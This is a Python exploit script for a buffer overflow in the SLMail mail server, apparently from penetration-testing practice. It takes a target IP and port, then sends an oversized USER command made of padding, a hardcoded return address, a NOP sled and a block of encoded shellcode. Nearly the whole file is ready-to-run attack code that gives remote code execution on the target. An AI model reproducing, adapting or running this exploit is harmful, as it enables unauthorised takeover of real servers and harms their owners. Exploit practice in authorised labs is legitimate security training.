#!/usr/bin/python3

import sys,socket

print("*******Slmail buffer overflow********")
ip_address=input("Enter the IP address\n")
port=input("Enter the port numeber\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*30)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*30)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buf =  b""
    buf += b"\xbe\xab\xab\x70\xc4\xda\xd9\xd9\x74\x24\xf4\x58"
    buf += b"\x31\xc9\xb1\x52\x83\xe8\xfc\x31\x70\x0e\x03\xdb"
    buf += b"\xa5\x92\x31\xe7\x52\xd0\xba\x17\xa3\xb5\x33\xf2"
    buf += b"\x92\xf5\x20\x77\x84\xc5\x23\xd5\x29\xad\x66\xcd"
    buf += b"\xba\xc3\xae\xe2\x0b\x69\x89\xcd\x8c\xc2\xe9\x4c"
    buf += b"\x0f\x19\x3e\xae\x2e\xd2\x33\xaf\x77\x0f\xb9\xfd"
    buf += b"\x20\x5b\x6c\x11\x44\x11\xad\x9a\x16\xb7\xb5\x7f"
    buf += b"\xee\xb6\x94\x2e\x64\xe1\x36\xd1\xa9\x99\x7e\xc9"
    buf += b"\xae\xa4\xc9\x62\x04\x52\xc8\xa2\x54\x9b\x67\x8b"
    buf += b"\x58\x6e\x79\xcc\x5f\x91\x0c\x24\x9c\x2c\x17\xf3"
    buf += b"\xde\xea\x92\xe7\x79\x78\x04\xc3\x78\xad\xd3\x80"
    buf += b"\x77\x1a\x97\xce\x9b\x9d\x74\x65\xa7\x16\x7b\xa9"
    buf += b"\x21\x6c\x58\x6d\x69\x36\xc1\x34\xd7\x99\xfe\x26"
    buf += b"\xb8\x46\x5b\x2d\x55\x92\xd6\x6c\x32\x57\xdb\x8e"
    buf += b"\xc2\xff\x6c\xfd\xf0\xa0\xc6\x69\xb9\x29\xc1\x6e"
    buf += b"\xbe\x03\xb5\xe0\x41\xac\xc6\x29\x86\xf8\x96\x41"
    buf += b"\x2f\x81\x7c\x91\xd0\x54\xd2\xc1\x7e\x07\x93\xb1"
    buf += b"\x3e\xf7\x7b\xdb\xb0\x28\x9b\xe4\x1a\x41\x36\x1f"
    buf += b"\xcd\xae\x6f\x7b\xeb\x47\x72\x83\xec\x07\xfb\x65"
    buf += b"\x78\x38\xaa\x3e\x15\xa1\xf7\xb4\x84\x2e\x22\xb1"
    buf += b"\x87\xa5\xc1\x46\x49\x4e\xaf\x54\x3e\xbe\xfa\x06"
    buf += b"\xe9\xc1\xd0\x2e\x75\x53\xbf\xae\xf0\x48\x68\xf9"
    buf += b"\x55\xbe\x61\x6f\x48\x99\xdb\x8d\x91\x7f\x23\x15"
    buf += b"\x4e\xbc\xaa\x94\x03\xf8\x88\x86\xdd\x01\x95\xf2"
    buf += b"\xb1\x57\x43\xac\x77\x0e\x25\x06\x2e\xfd\xef\xce"
    buf += b"\xb7\xcd\x2f\x88\xb7\x1b\xc6\x74\x09\xf2\x9f\x8b"
    buf += b"\xa6\x92\x17\xf4\xda\x02\xd7\x2f\x5f\x22\x3a\xe5"
    buf += b"\xaa\xcb\xe3\x6c\x17\x96\x13\x5b\x54\xaf\x97\x69"
    buf += b"\x25\x54\x87\x18\x20\x10\x0f\xf1\x58\x09\xfa\xf5"
    buf += b"\xcf\x2a\x2f"

    buffer=b"A" * 558 + b"\x8F\x35\x4A\x5F" + b"\x90"*16 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))
    s.send(b"USER HRISHI" + b"\r\n")
    s.send(b"USER " + buffer + b"\r\n")
    s.close()
